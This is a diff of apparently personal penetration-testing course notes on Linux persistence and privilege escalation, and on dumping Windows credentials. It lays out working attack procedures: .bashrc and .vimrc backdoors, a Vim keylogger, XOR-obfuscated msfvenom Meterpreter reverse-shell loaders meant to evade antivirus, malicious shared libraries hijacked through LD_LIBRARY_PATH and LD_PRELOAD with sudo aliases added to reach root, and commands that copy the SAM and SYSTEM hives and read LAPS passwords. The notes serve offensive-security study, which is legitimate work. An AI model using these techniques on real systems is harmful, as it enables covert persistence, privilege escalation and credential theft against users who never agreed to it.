@@ -3276,13 +3276,11 @@ command (client) 1> listen 127.0.0.1:3389 172.16.51.21:3389
 
 ## User Configuration Files
 
-`.bash_profile` is executed when logging in to the system initially. This happens when logging in to the machine itself, via a serial console or SSH.
+`.bash_profile` is executed when logging in to the system initially, via a serial console or SSH.
 
 `.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.
 
-=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system.
-
-=> Maintain persistence, escalate privileges, or engage in other offensive activity.
+=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system to maintain persistence, escalate privileges
 
 ```bash
 echo "touch /tmp/bashtest.txt" >> ~/.bashrc
@@ -3290,23 +3288,21 @@ echo "touch /tmp/bashtest.txt" >> ~/.bashrc
 
 ### VIM Config Simple Backdoor
 
-To print a message to the user, use the following command in the `.vimrc` file or within the editor
+To print a message to the user, use this command in the `.vimrc` file or within the editor:
 
 `:echo "this is a test"`
 
-Since VIM has access to the shell environment's variables, we can use $USER to get the username or $UID to get the user's ID number.
+Since VIM has access to the shell environment's variables, we can use **$USER** to get the username or **$UID** to get the user's ID number.
 
-The commands specified in the `.vimrc` file are executed when VIM is launched. By editing this file, we can cause a user's VIM session to **perform unintended actions on their behalf** when VIM is run.
+The commands specified in the `.vimrc` file are executed when VIM is launched. => cause a user's VIM session to **perform unintended actions on their behalf** when VIM is run.
 
-To run **shell commands** from within the config file
+To run **shell commands** from within the config file:
 
 `!touch /tmp/test.txt`
 
-By default, VIM allows shell commands but some hardened environments have VIM configured to restrict them.
+By default, VIM allows shell commands but some hardened environments have VIM configured to restrict them. (e.g., calling VIM with the `-Z` parameter on the command line)
 
-Calling VIM with the `-Z` parameter on the command line, then attempting to run a shell command will result in an error message indicating that such commands are not allowed.
-
-Putting our commands directly into the user's `.vimrc` file isn't  stealthy, as a user modifying their own settings may accidentally discover the changes.
+Putting our commands directly into the user's `.vimrc` file isn't stealthy, as a user modifying their own settings may accidentally discover the changes.
 
 => "Source" a shell script using the bash `source` command. This loads a specified shell script and runs it.
 
@@ -3316,7 +3312,7 @@ Note: Source call for loading a VIM configuration file is prepended with a **col
 
 **VIM plugin directory**: All VIM config files (have a `.vim` extension) located in the user's `~/.vim/plugin` directory will be loaded when VIM is run.
 
-The `:silent` command mutes any debug output which would normally be sent to the user when running VIM.
+The `:silent` command mutes any debug output:
 
 `.vimrc` file
 
@@ -3325,18 +3321,20 @@ The `:silent` command mutes any debug output which would normally be sent to the
 
 `/home/offsec/.vimrunscript` file
 
-```
+```bash
 #!/bin/bash
 echo "hacked" > /tmp/hacksrcout.txt
 ```
 
-We can gain root privileges if the user runs VIM as root or uses the `visudo` command
+We can gain root privileges if the user runs VIM as **root** or uses the `visudo` command
 
-VIM handles its configuration files differently for a user in a sudo context depending on the distribution of Linux:
-* On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file even in a sudo context.
-* On a Debian: In a sudo context, VIM will use the root user's VIM configuration.
+VIM handles its configuration files differently for a user **in a sudo context** depending on the distribution of Linux:
 
-On a Debian or similar system that does not persist the user's shell environment information when moving to a sudo context, add an alias to the user's `.bashrc` file, i.e. replaces a standard sudo call with one that will force sudo to persist the user's VIM settings.
+* On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file.
+
+* On a Debian: VIM will use the root user's VIM configuration.
+
+=> add an alias to the user's `.bashrc` file
 
 `alias sudo="sudo -E"`
 
@@ -3354,7 +3352,7 @@ sudo -l
 
 `(root) NOPASSWD: /usr/bin/vim /opt/important.conf`
 
-This limited access can be set in the `/etc/sudoers` file with the same syntax as the line above. In this case, a password is not required for sudo access.
+This limited access can be set in the `/etc/sudoers` file with the same syntax. In this case, a password is not required for sudo access.
 
 Run VIM and then enter `:shell` to gain a root shell automatically. If a password was required, use the alias vector to gain root access with our backdoor script.
 
@@ -3362,17 +3360,17 @@ Note: Many administrators now require the use of `sudoedit` for modifying sensit
 
 ### VIM Config Simple Keylogger
 
-Create a keylogger to log any changes a user makes to a file => for capturing sensitive data in configuration files or scripts.
+Create a keylogger to log any changes a user makes to a file => capturing sensitive data in configuration files or scripts.
 
-**autocommand** settings are internal to VIM and do not require the shell (even if the current system uses a restricted VIM environment that blocks any shell commands).
+**autocommand** settings do not require the shell (even if the current system uses a restricted VIM environment that blocks any shell commands).
 
 Use `:autocmd` in a VIM configuration file or in the editor to set actions for a collection of predefined events.
 
-E.g., VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and BufWritePost (after writing a change buffer to a file).
+E.g., VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and **BufWritePost** (after writing a change buffer to a file).
 
-We don't want to risk preventing the user from actually saving their files as this might alert them. To avoid this, perform our actions based on the **BufWritePost** event. This activates once a buffer has already been written to the intended file.
+Perform our actions based on the **BufWritePost** event. This activates once a buffer has already been written to the intended file.
 
-VIM supports the use of basic if statements in its configuration scripts in this manner.
+VIM supports the use of basic if statements in its configuration scripts.
 
 ```
 :if <some condition>
@@ -3382,11 +3380,14 @@ VIM supports the use of basic if statements in its configuration scripts in this
 :endif
 ```
 
-With environment variables, we can check whether the user is running as root.
-The "*" specifies that this action will be performed for all files being edited. We could change this to match only files with a particular name or file extension.
-Then use :w! to save the buffer contents.
+With environment variables, check whether the user is running as **root**.
 
-Put our command in `/home/offsec/.vim/plugin/settings.vim`.
+The "*" specifies that this action will be performed for all files being edited.
+=> could change this to match only files with a particular name or file extension.
+
+Then use `:w!` to save the buffer contents.
+
+`/home/offsec/.vim/plugin/settings.vim`.
 
 ```
 :if $USER == "root"
@@ -3394,7 +3395,7 @@ Put our command in `/home/offsec/.vim/plugin/settings.vim`.
 :endif
 ```
 
-It's also possible to run shell commands on an autocommand trigger. Just replace everything after ":silent" with "!" followed by a shell script name or shell command.
+It's also possible to run shell commands on an autocommand trigger. Just replace everything after "`:silent`" with "`!`" followed by a shell script name or shell command.
 
 
 ## Bypassing AV
@@ -3423,7 +3424,7 @@ Query Kaspersky's event log
 sudo kesl-control -E --query | grep DetectName
 ```
 
-A 64-bit Meterpreter payload encoded with the x64/zutto_dekiru encoder is not detected by the AV.
+A 64-bit Meterpreter payload encoded with the `x64/zutto_dekiru` encoder is not detected by the AV.
 
 Restore real-time protection 
 
@@ -3431,7 +3432,7 @@ Restore real-time protection
 sudo kesl-control --start-t 1
 ```
 
-Generate a 64-bit unencoded shellcode with msfvenom, with an output type of "c", then insert it in a C program, which will act as a wrapper to load and run the shellcode.
+Generate a 64-bit unencoded shellcode with msfvenom, which will act as a wrapper to load and run the shellcode.
 
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
@@ -3476,8 +3477,8 @@ Create an encoder program to perform an XOR operation on our payload string to p
 #include <stdlib.h>
 #include <unistd.h>
 
-unsigned char buf[] = 
-"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a";
+// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
+unsigned char buf[] = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31...";
 
 int main (int argc, char **argv) 
 {
@@ -3506,7 +3507,7 @@ gcc -o encoder.out encoder.c
 #include <unistd.h>
 
 // Our obfuscated shellcode
-unsigned char buf[] = "\x20\x73\x12\x45\x4F\x02\xCF\x8A...x32\x71\x02\xDD\x02\xF3\x48";
+unsigned char buf[] = "\x20\x73\x12\x45\x4F\x02\xCF\x8A...";
 
 int main (int argc, char **argv) 
 {
@@ -3528,11 +3529,9 @@ gcc -o hack2.out hack2.c -z execstack
 
 ## Shared Libraries
 
-When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order. When it finds a copy of the library it needs, it stops searching and loads the module it finds.
+When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order. When it finds a copy of the library it needs, it stops searching and loads the module it finds:
 
-The application searches for libraries in these locations, following this ordering:
-
-1. Directories listed in the application's RPATH value.
+1. Directories listed in the application's **RPATH** value.
 2. Directories specified in the **LD_LIBRARY_PATH** environment variable.
 3. Directories listed in the application's RUNPATH value.
 4. Directories specified in `/etc/ld.so.conf`.
@@ -3540,23 +3539,25 @@ The application searches for libraries in these locations, following this orderi
 
 ### Shared Library Hijacking via LD_LIBRARY_PATH
 
-After checking its internal RPATH values for hard coded paths, it then checks for an environment variable called **LD_LIBRARY_PATH**.
+After checking its internal **RPATH** values for hard coded paths, it then checks for an environment variable called **LD_LIBRARY_PATH**.
 
-Intended use cases for this include **testing new library versions** without modifying existing libraries or modifying the program's behavior temporarily for debugging purposes.
+Intended use cases include **testing new library versions** without modifying existing libraries or modifying the program's behavior temporarily for debugging purposes.
 
-=> Exploit a victim user's application by creating a malicious library and then use LD_LIBRARY_PATH to hijack the application's normal flow and execute our malicious code to escalate privileges.
+=> Exploit a victim user's application by creating a malicious library and then use **LD_LIBRARY_PATH** to hijack the application's normal flow and execute our malicious code to escalate privileges.
 
-For demonstration, we are explicitly setting the environment variable before each call. However, as an attacker, we would want to insert a line in the user's `.bashrc` or `.bash_profile` to define the LD_LIBRARY_PATH variable so it is set automatically when the user logs in.
+For demo, we are explicitly setting the environment variable before each call. However, an attacker would insert a line in the user's `.bashrc` or `.bash_profile` to define the **LD_LIBRARY_PATH** variable so it is set automatically when the user logs in.
 
-One difficulty with using LD_LIBRARY_PATH is that on most modern systems, user environment variables are not passed on when using `sudo`. This setting is configured in the `/etc/sudoers` file by using the **env_reset** keyword as a default. Some systems are configured to allow a user's environment to be passed on to sudo. These will have **env_keep** set instead.
+One difficulty is that on most modern systems, user environment variables are not passed on when using `sudo`. This setting is configured in the `/etc/sudoers` file by using the **env_reset** keyword as a default.
 
-Bypass the env_reset setting with our `.bashrc` alias for the sudo command. 
+Some systems are configured to allow a user's environment to be passed on to sudo. These will have **env_keep** set instead.
+
+Bypass the **env_reset** setting with our `.bashrc` alias for the sudo command. 
 
 `alias sudo="sudo -E"`
 
 As a normal user, it's not typically possible to read `/etc/sudoers` to know if env_reset is set, so it may be useful to create this alias setting regardless.
 
-A simple malicious, shared library
+A simple malicious shared library
 
 `hax.c`
 
@@ -3575,7 +3576,7 @@ void runmahpayload() {
 }
 ```
 
-Constructor functions are run when the library is first initialized in order to set up code for the library to use.
+**Constructor functions** are run when the library is first initialized in order to set up code for the library to use.
 
 We initially set the user's UID and GID to "0", which will make the user root if run in a sudo context.
 
@@ -3587,19 +3588,21 @@ gcc -shared -o libhax.so hax.o
 ```
 
 * -Wall: gives more verbose warnings when compiling.
-* -fPIC: use position independent code,  which is suitable for shared libraries since they are loaded in unpredictable memory locations.
+* -fPIC: use position independent code,  suitable for shared libraries since they are loaded in unpredictable memory locations.
 * -c: compile but not link the code
 * -shared: create a shared library from our object file.
 
-Shared libraries in Linux use the soname naming convention, which may also include a version number appended to the end.
+Shared libraries in Linux naming convention may also include a version number appended to the end.
 
 E.g., `lib<libraryname>.so.1`
 
-We want to hijack the library of a program that a victim is likely to run, especially as sudo. E.g., `top` command. User might run this as sudo in order to display processes with elevated permissions.
+To hijack the library of a program that a victim is likely to run, especially as sudo.
 
-Ideally, we want to target a library that also allows the program to run correctly even after our exploit is run, but this may not always be possible.
+=> `top` command. User might run this as sudo in order to display processes with elevated permissions.
 
-Give information on which libraries are being loaded when top is being run.
+Ideally, target a library that also allows the program to run correctly even after our exploit is run, but this may not always be possible.
+
+Give information on which libraries are being loaded when `top` is being run.
 
 ```bash
 ldd /usr/bin/top
@@ -3609,63 +3612,33 @@ ldd /usr/bin/top
 libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
 ```
 
-The library listed appears to be a library for error reporting called `LibGPG-Error.7` This is likely to be loaded by the application but not likely to be called unless the program encounters an error => shouldn't prevent normal use of the application.
+A library for error reporting called `LibGPG-Error` is likely to be loaded by the application but not likely to be called unless the program encounters an error => shouldn't prevent normal use of the application.
 
 ```bash
 export LD_LIBRARY_PATH=/home/offsec/ldlib/
-cp libhax.so libgpg-error.so.0
+cp libhax.so /home/offsec/ldlib/libgpg-error.so.0
 ```
 
 To later turn off the malicious library functionality, unset the environment variable using the `unset` command.
 
-Our exploit fails miserably
-
 ```bash
 top
 ```
+
+Our exploit fails miserably
 
 ```
 top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
 top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
 ```
 
-Error message about the shared **library's version information**. It seems that **libgcrypt** does require version information in associated libraries.
-
-Not all supporting libraries require version information, so this does not always occur. The version number for these symbols doesn't have any direct impact on our exploit, but it fulfills the version requirement that is causing our earlier error message.
-
-=> A map file that identifies particular symbols as being associated with a given version of the library.
-
-```bash
-readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
-```
-
-```
-gpgrt_onclose;
-_gpgrt_putc_overflow;
-gpgrt_feof_unlocked;
-gpgrt_vbsprintf;
-...
-```
-
-Wrap a list of symbols into a symbol map file `gpg.map`
-
-```
-GPG_ERROR_1.0 {
-gpgrt_onclose;
-_gpgrt_putc_overflow;
-...
-gpgrt_fflush;
-gpgrt_poll;
-
-};
-```
-
-We're also missing the symbol **gpgrt_lock_lock** with a version of **GPG_ERROR_1.0**.
+We're missing the symbol **gpgrt_lock_lock** with a version of **GPG_ERROR_1.0**.
 
 When loading a library, a program only wants to know that our library contains symbols of that name. It doesn't care anything about validating their type or use.
 
 * -s: give a list of available symbols in the library.
 Not all of the listed symbols are needed since some of them refer to other libraries. The symbol it's looking for is tagged with GPG_ERROR_1.0.
+
 * --wide: force it to include the untruncated names of the symbols, as well as the full path to the original shared library file.
 
 ```bash
@@ -3681,6 +3654,37 @@ int gpgrt_fflush;
 int gpgrt_poll;
 ```
 
+Error message about the shared **library's version information** => **libgcrypt** does require version information in associated libraries (Not all supporting libraries require version information).
+
+=> A map file that identifies particular symbols as being associated with a given version of the library.
+
+```bash
+readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
+```
+
+```
+gpgrt_onclose;
+_gpgrt_putc_overflow;
+gpgrt_feof_unlocked;
+gpgrt_vbsprintf;
+...
+```
+
+Wrap a list of symbols into a symbol map file
+
+`gpg.map`
+
+```
+GPG_ERROR_1.0 {
+gpgrt_onclose;
+_gpgrt_putc_overflow;
+...
+gpgrt_fflush;
+gpgrt_poll;
+
+};
+```
+
 `hax.c`
 
 ```C
@@ -3705,15 +3709,17 @@ void runmahpayload() {
 
 ```bash
 gcc -Wall -fPIC -c -o hax.o hax.c
-gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
+gcc -shared -Wl,--version-script gpg.map -o /home/offsec/ldlib/libgpg-error.so.0 hax.o
 
 export LD_LIBRARY_PATH=/home/offsec/ldlib/
 top
 ```
 
-In modern Linux distributions a user's environment variables aren't normally passed to a sudo context. => create an alias for sudo in the user's `.bashrc` file replacing `sudo` with `sudo -E`. However, **some environment variables are not passed even with this approach**. E.g., LD_LIBRARY_PATH.
+In modern Linux distributions, a user's environment variables aren't normally passed to a sudo context.
 
-Modify the alias to include our LD_LIBRARY_PATH variable explicitly `.bashrc`
+=> Create an alias for sudo in the user's `.bashrc` file replacing `sudo` with `sudo -E`. However, **some environment variables are not passed even with this approach**. E.g., LD_LIBRARY_PATH.
+
+Modify the alias to include our **LD_LIBRARY_PATH** variable explicitly `.bashrc`
 
 `alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"`
 
@@ -3721,6 +3727,9 @@ Source the `.bashrc` file to load the changes we made
 
 ```bash
 source ~/.bashrc
+```
+
+```bash
 sudo top
 ```
 
@@ -3728,23 +3737,15 @@ sudo top
 
 **LD_PRELOAD** is an environment variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library before any others.
 
-=> Functions that are defined in this library are used before any with the same method signature that are defined in other libraries.
+=> Functions defined in this library are used before any with the **same method signature** that are defined in other libraries. => **function hooking**
 
 A **method signature** is the information that a program needs to define a method. It consists of the value type the method will return, the method name, a listing of the parameters it needs, and each of their data types.
 
-LD_PRELOAD faces a similar limitation as the LD_LIBRARY_PATH exploit vector. Sudo will explicitly ignore the LD_PRELOAD environment variable for a user unless the user's real UID is the same as their effective UID. => it will hinder the privilege escalation approach described earlier.
+Sudo will explicitly **ignore** the **LD_PRELOAD** environment variable for a user unless the user's real UID is the same as their effective UID.
 
-Libraries specified by LD_PRELOAD are loaded before any others the program will use. => methods we define in a library loaded by LD_PRELOAD will override methods loaded later on.
+Find an application that the victim is likely to frequently use (with sudo) => `cp` utility 
 
-Overriding methods in this way is a technique known as **function hooking**.
-
-Because the original libraries are also still being loaded, we can call the original functions and allow the program to continue working as intended.
-
-Load our own malicious shared library. We'll also load the original libraries, meaning the program will run as intended, which will help us keep a low profile.
-
-Find an application that the victim is likely to frequently use. One potential option is the `cp` utility, which is used to copy files between locations on the system. This utility is often used with sudo.
-
-We can run `ltrace` on the cp command to get a list of library function calls it uses during normal operation.
+Run `ltrace` to get a list of library function calls it uses during normal operation (`ltrace` is not installed by default on all Linux distributions.)
 
 ```bash
 ltrace cp
@@ -3754,26 +3755,18 @@ ltrace cp
 strrchr("cp", '/')          = nil
 ...
 geteuid()                   = 1000
-getenv("POSIXLY_CORRECT")   = nil
 ...
-fflush(0x7f717f0c0680)      = 0
 fclose(0x7f717f0c0680)      = 0
 +++ exited (status 1) +++
 ```
 
-ltrace is not installed by default on all Linux distributions. It can also be installed through the standard package repositories.
-
 In a real-world scenario, it is ideal to run this on the target machine if possible to ensure that the library calls correctly match the target's system and program configuration.
 
-geteuid function is a good candidate because it seems to only be called once during the application run, which limits how frequently our code will be executed. Using this function will limit redundant shells.
+`geteuid` function is a good candidate because it seems to only be called once during the application run, which limits how frequently our code will be executed.
+
+=> limit redundant shells.
 
 It takes no parameters and returns the user's UID number.
-
-Let's try to hook this call through our own malicious shared library.
-
-In our library, we'll simply redefine the geteuid function. We don't need to define a constructor function as we did in the previous examples. This is because we want to fire our payload when a library function is being called, rather than when the library is loaded.
-
-Also, this will allow us to "patch" what the library is doing and still retain its original behavior.
 
 `dlfcn.h` defines functions for interacting with the dynamic linking loader.
 
@@ -3787,8 +3780,8 @@ Also, this will allow us to "patch" what the library is doing and still retain i
 #include <dlfcn.h>
 #include <unistd.h>
 
-char buf[] = 
-"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9";
+// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
+char buf[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6...";
 
 uid_t geteuid(void)
 {
@@ -3815,19 +3808,23 @@ uid_t geteuid(void)
 }
 ```
 
-Define our geteuid function. The signature matches the original. It has no parameters (void) and returns a value of uid_t, which in this case is simply an integer.
+Use the `dlsym` function to get the memory address of the original version of the `geteuid` function. It will skip our version of the function and find the next one, which should be the original version loaded by the program the user called.
 
-Defines a pointer, which we'll use to point to the old geteuid function.
-        
-This provides us access to the original function so that we can call it later on. This will allow us to retain the original functionality of the program.
+If we use it as-is, when we run our target application, it will stop and wait for our shell to return before continuing. => The `cp` program will stall => raise suspicion.
 
-Use the `dlsym` function to get the memory address of the original version of the geteuid function. The dlsym function finds a symbol for a dynamic library in memory. When calling it, we give it the name of the symbol we're trying to find (in this case "geteuid"). This will return the next occurrence of "geteuid" in memory outside of the current library. Calling this will skip our version of the function and find the next one, which should be the original version loaded by the program the user called.
+Ideally, we want the program to return right away, but still run our shell in the background.
 
-If we use it as-is, when we run our target application, it will stop and wait for our shell to return before continuing. This means that the function will stall and the cp program will stall as well. This will certainly raise suspicion.
+=> Create a new process for our shell by using the `fork` method, which creates a new process by duplicating the parent process.
 
-Ideally, we want the program to return right away, but still run our shell in the background. In order to do this, we need to create a new process for our shell. We can do this using the fork11 method, which creates a new process by duplicating the parent process. This line in the code determines whether or not the result of the fork call is zero. If it is, we are running inside the newly created child process, and can run our shell as we did with our earlier AV bypass shell application. Otherwise, it will return the expected value of geteuid to the original calling program so it can continue as intended. The final two lines provide a meaningless return value in case the code reaches that point, which realistically should never happen.
+If the result of the fork call is zero, we are running inside the newly created child process, and can run our shell. Otherwise, it will return the expected value of geteuid to the original calling program so it can continue as intended.
+
+The final 2 lines provide a meaningless return value in case the code reaches that point, which realistically should never happen.
        
-The code within the fork branch checks that the shellcode resides on an executable memory page before executing it. The reason for this additional step is that the -f PIC compilation flag relocates our shellcode to the library .data section in order to make it position independent. Specifically, the code gets the size of a memory page so it knows how much memory to access. It then changes the page of memory that contains our shellcode and makes it executable using mprotect. It does this by setting its access properties to PROT_READ and PROT_EXEC, which makes our code readable and executable. If changing the memory permissions fails, the program will exit with a return code of "-1".
+The code within the fork branch checks that the shellcode resides on an executable memory page before executing it.
+
+`-f PIC` compilation flag relocates our shellcode to the library `.data` section in order to make it position independent. Specifically, the code gets the size of a memory page so it knows how much memory to access.
+
+It then changes the page of memory that contains our shellcode and makes it executable using **mprotect**. + setting its access properties to **PROT_READ** and **PROT_EXEC**, which makes our code readable and executable.
 
 ```bash
 gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
@@ -3835,26 +3832,19 @@ gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
 ```
 
 ```bash
-cp /etc/passwd /tmp/testpasswd
 export LD_PRELOAD=/home/offsec/evil_geteuid.so
 cp /etc/passwd /tmp/testpasswd
-HACK: returning from function...
 ```
 
-elevated our privileges
-Before continuing, we'll unset LD_PRELOAD which could have adverse effects on other system actions we'll perform.
+To elevate our privileges
 
-offsec@linuxvictim:~$ unset LD_PRELOAD
+The dynamic linker ignores LD_PRELOAD when the user's effective UID (EUID) does not match its real UID, e.g., when running commands as sudo.
 
-Now that we've got it working, let's talk about privilege escalation with this method.
+We might be lucky and have `env_keep+=LD_PRELOAD` set in `/etc/sudoers`, but it's not likely. The env_keep setting specifically allows certain environment variables to be passed into the sudo session when calls are made. By default this is turned off.
 
-As we mentioned previously, the dynamic linker ignores LD_PRELOAD when the user's effective UID (EUID) does not match its real UID, for example when running commands as sudo. We might be lucky and have env_keep+=LD_PRELOAD set in /etc/sudoers, but it's not likely. The env_keep setting specifically allows certain environment variables to be passed into the sudo session when calls are made. By default this is turned off.
-We could try our previous approach of defining a sudo alias for the user, but a quick test indicates that our code isn't executed. In this case, we need to explicitly set LD_PRELOAD when calling sudo, which we can do in the alias in .bashrc.
+To explicitly set LD_PRELOAD when calling sudo in `.bashrc`.
 
 `alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"`
-
-Note that if we were to execute this attack in the normal user's context, we would want to set the environment variable in the user's .bashrc or .bash_profile, similar to what we did with LD_LIBRARY_PATH.
-After reloading our .bashrc file as we did before with source, we can run the cp command again.
 
 ```bash
 sudo cp /etc/passwd /tmp/testpasswd
@@ -3863,6 +3853,511 @@ sudo cp /etc/passwd /tmp/testpasswd
 # Linux Lateral Movement
 
 # Windows Credentials
+
+## SAM Database
+
+Local Windows credentials are stored in the Security Account Manager (SAM) database as password hashes using the NTLM hashing format, which is based on the MD4 algorithm.
+
+We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine.
+
+The built-in default-named Administrator account is installed on all Windows-based machines.
+
+This account has been disabled on desktop editions since Windows Vista, but it is enabled on servers by default. To ease administrative tasks, system administrators often enable this default account on desktop editions and set a single shared password.
+
+Every Windows account has a unique Security Identifier (SID):
+
+`S-R-I-S`
+
+The SID begins with a literal "S" to identify the string as a SID, followed by a revision level (usually set to "1"), an identifier-authority value (often "5") and one or more subauthority values.
+
+The subauthority will always end with a Relative Identifier (RID) representing a specific object on the machine.
+
+The **local administrator account** is sometimes referred to as **RID 500** due to its static RID value of 500.
+
+Determine the local computername from the associated environment variable and use it with the WMI Win32_UserAccount class.
+
+```pwsh
+$env:computername
+```
+
+Specify the computername through the Domain property and the account name through the Name property.
+
+```pwsh
+[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
+```
+
+The SAM is located at `C:\Windows\System32\config\SAM`, but the SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from an administrative command prompt.
+
+```bat
+copy c:\Windows\System32\config\sam C:\Users\offsec.corp1\Downloads\sam
+```
+
+It is possible to perform a physical attack as well by booting the computer off an external media like a USB into a Linux-based operating system and accessing the content of the hard drive.
+
+2 potential workarounds.
+
+1. Use the Volume Shadow Copy Server, which can create a snapshot (or "shadow volume") of the local hard drive with `vssadmin`, which is installed on Windows 8.1 and later. We can create a new shadow volume with the `create shadow` option, but this option is only available on server editions of the tool.
+
+2. (Will work on our Windows 10 machine) Execute this from an administrative command prompt to create a snapshot of the C drive.
+
+```bat
+wmic shadowcopy call create Volume='C:\'
+```
+
+To verify this, we'll run vssadmin and list the existing shadow volumes with list shadows:
+
+```bat
+vssadmin list shadows
+```
+
+Copy the SAM database from it
+
+```bat
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
+```
+
+The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM database. However, it is also locked by the SYSTEM account.
+
+```bat
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
+```
+
+We can also obtain a copy of the SAM database and SYSTEM files from the registry in the `HKLM\sam` and `HKLM\system` hives, respectively. Administrative permissions are required to read and copy.
+
+```bat
+reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
+reg save HKLM\system C:\users\offsec.corp1\Downloads\system
+```
+
+2 tools that can decrypt these files are Mimikatz and Creddump7
+
+```bash
+sudo apt install python-crypto
+git clone https://github.com/CiscoCXSecurity/creddump7
+
+source Github/creddump7/creddump7-venv/bin/activate
+python2 pwdump.py system sam
+```
+
+## Hardening the Local Administrator Account
+
+To prevent attacks that leverage shared Administrator passwords, Microsoft introduced **Group Policy Preferences**, which included the ability to **centrally change local administrator account passwords**.
+
+However, this approach stored data in an XML file in a **SYSVOL** folder, which must be accessible to all computers in Active Directory. => obvious security issue since the unhashed local administrator password was stored on an easily-accessible share.
+
+To solve this issue, Microsoft AES-256 encrypted them:
+
+```xml
+<?xml version="1.0" encoding="utf-8" ?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D224D26}">
+	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2015-05-22 05:01:55" uid="{D5FE7352-81E1-42A2-B7DA-118402BE4C33}">
+		<Properties action="U" newName="ADSAdmin" fullName="" description"" cpassword="RI133B2WI2CiIOCau1DtrtTe3wdFwzCiWB5PSAxXMDstchJt3bLOUie0BaZ/7rdQjuqTonF3ZWAKa1iRvd4JGQ" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)" expires="2015-05-21" />
+	</User>
+</Groups>
+```
+
+The AES-256 encrypted password is realistically unbreakable given a strong key. Surprisingly, Microsoft published the AES private key on MSDN, effectively breaking their own encryption.
+
+The `Get-GPPPassword` PowerShell script could effectively locate and decrypt any passwords found in affected systems' SYSVOL folder.
+
+Microsoft issued a security update, which removed the ability to create Group Policy Preferences containing passwords.
+
+Although these files could no longer be created, existing Group Policy Preferences containing passwords were not removed => some may still exist in the wild.
+
+Microsoft released the **Local Administrator Password Solution (LAPS)**, which offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers.
+
+LAPS introduces 2 new attributes for the computer object into Active Directory. 
+
+1. **ms-mcs-AdmPwdExpirationTime**, which registers the expiration time of a password as directed through a group policy.
+
+2. **ms-mcs-AdmPwd**, which contains the clear text password of the local administrator account.
+
+LAPS uses `admpwd.dll` to change the local administrator password and push the new password to the **ms-mcs-AdmPwd** attribute of the associated computer object.
+
+If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory as part of a penetration test.
+
+Use the **LAPSToolkit** PowerShell script
+
+List all computers that are set up with LAPS and display the hostname, the clear text password, and the expiration time:
+
+```pwsh
+Import-Module .\LAPSToolkit.ps1
+Get-LAPSComputers
+```
+
+Our current user account does not have permissions to read the password, so it is returned as empty.
+
+Discover groups that can fully enumerate the LAPS data:
+
+```pwsh
+Find-LAPSDelegatedGroups
+```
+
+Enumerate members of that group with PowerView
+
+```pwsh
+Get-NetGroupMember -GroupName "LAPS Password Readers"
+```
+
+These permissions are often given to both help desk employees and system administrators.
+
+```pwsh
+Import-Module .\LAPSToolkit.ps1
+Get-LAPSComputers
+```
+
+## Access Token
+
+As penetration testers, 2 concepts relating to the access token, specifically integrity levels and privileges.
+
+Windows defines 4 integrity levels, which determine the level of access: low, medium, high, and system.
+
+- Low integrity is used with sandbox processes like web browsers.
+- Applications executing in the context of a regular user run at medium integrity, and administrators can execute applications at high integrity.
+- System is typically only used for SYSTEM services.
+
+It's not possible for a process of a certain integrity level to modify a process of higher integrity level but the opposite is possible.
+
+Local administrators receive 2 access tokens when authenticating.
+
+1. (which is used by default) is configured to create processes as medium integrity.
+
+2. When a user selects the "Run as administrator" option for an application, elevated token is used instead, and allows the process to run at high integrity.
+
+The User Account Control (UAC) mechanism links these two tokens to a single user and creates the consent prompt.
